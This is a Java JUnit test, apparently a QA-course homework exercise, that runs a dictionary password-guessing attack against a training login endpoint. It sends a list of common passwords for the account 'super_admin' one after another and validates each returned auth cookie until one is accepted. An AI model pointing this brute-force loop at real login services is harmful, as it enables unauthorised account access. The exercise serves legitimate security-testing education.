import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.stream.Collectors;
import java.util.stream.Stream;

public class PasswordTest {
    List<String> MostCommonPasswordsFromWiki = Stream.of(
            "password", "123456", "123456789", "12345678", "12345", "qwerty", "abc123", "football", "1234567",
            "monkey",	"monkey",	"123456789","123456789",	"123456789",	"qwerty",	"123456789",	"111111",	"12345678",
            "1234567",	"letmein",	"111111",	"1234",	"football",	"1234567890",	"letmein",	"1234567",	"12345",
            "letmein",	"dragon",	"1234567",	"baseball",	"1234",	"1234567",	"1234567",	"sunshine",	"iloveyou",
            "trustno1",	"111111",	"iloveyou",	"dragon",	"1234567",	"princess",	"football",	"qwerty",	"111111",
            "dragon",	"baseball",	"adobe123",	"football",	"baseball",	"1234",	"iloveyou",	"iloveyou",	"123123",
            "baseball",	"iloveyou",	"123123",	"1234567", "welcome",	"login",	"admin",	"princess",	"abc123",
            "111111",	"trustno1",	"admin",	"monkey",	"1234567890",	"welcome",	"welcome",	"admin",	"qwerty123",
            "iloveyou",	"1234567",	"1234567890",	"letmein",	"abc123",	"solo",	"monkey",	"welcome",	"1q2w3e4r",
            "master",	"sunshine",	"letmein",	"abc123",	"111111",	"abc123",	"login",	"666666",	"admin",
            "sunshine",	"master",	"photoshop",	"111111",	"1qaz2wsx",	"admin",	"abc123",	"abc123",	"qwertyuiop",
            "ashley",	"123123",	"1234",	"mustang",	"dragon",	"121212",	"starwars",	"football",	"654321",
            "bailey",	"welcome",	"monkey",	"access",	"master",	"flower",	"123123",	"123123",	"555555",
            "passw0rd",	"shadow",	"shadow",	"shadow",	"monkey",	"passw0rd",	"dragon",	"monkey",	"lovely",
            "shadow",	"ashley",	"sunshine",	"master",	"letmein",	"dragon",	"passw0rd",	"654321",	"7777777",
            "123123",	"football",	"12345",	"michael",	"login",	"sunshine",	"master",	"!@#$%^&*",	"welcome",
            "654321",	"jesus",	"password1",	"superman",	"princess",	"master",	"hello",	"charlie",	"888888",
            "superman",	"michael",	"princess",	"696969",	"qwertyuiop",	"hottie",	"freedom",	"aa123456",	"princess",
            "qazwsx",	"ninja",	"azerty",	"123123",	"solo",	"loveme",	"whatever",	"donald",	"dragon",
            "michael",	"mustang",	"trustno1",	"batman",	"passw0rd",	"zaq1zaq1",	"qazwsx",	"password1",	"password1",
            "Football",	"password1",	"000000",	"trustno1",	"starwars",	"password1",	"trustno1",	"qwerty123",	"123qwe").collect(Collectors.toList());
    List<String> Passwords = MostCommonPasswordsFromWiki.stream().distinct().collect(Collectors.toList());

    String login = "super_admin";
    String password;
    String urlHomework = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework";
    String urlCheck = "https://playground.learnqa.ru/ajax/api/check_auth_cookie";

    @Test
    public void PasswordTest() {
        boolean isAuthorized = false;
        int i = 0;
        while (! isAuthorized) {
            password = Passwords.get(i);
            Map<String, String> body = new HashMap<>();
            body.put("login", login);
            body.put("password", password);
            //            System.out.println(body);
            Response responseGetSecretPass = RestAssured
                    .given()
                    .body(body)
                    .when()
                    .post(urlHomework)
                    .andReturn();
            String responseCookie = responseGetSecretPass.getCookie("auth_cookie");
            Map<String, String> cookies = new HashMap<>();
            if (responseCookie != null) {
                cookies.put("auth_cookie", responseCookie);
            }

            Response responseCheckAuthCookie = RestAssured
                    .given()
                    .body(body)
                    .cookies(cookies)

                    .when()
                    .post(urlCheck)
                    .andReturn();

            String result = responseCheckAuthCookie.htmlPath().getString("body");
            if (result.equals("You are authorized")) {
                isAuthorized = true;
                System.out.println("Пароль: " + password);
                System.out.println(result);
            }
            i++;
        }
    }
}
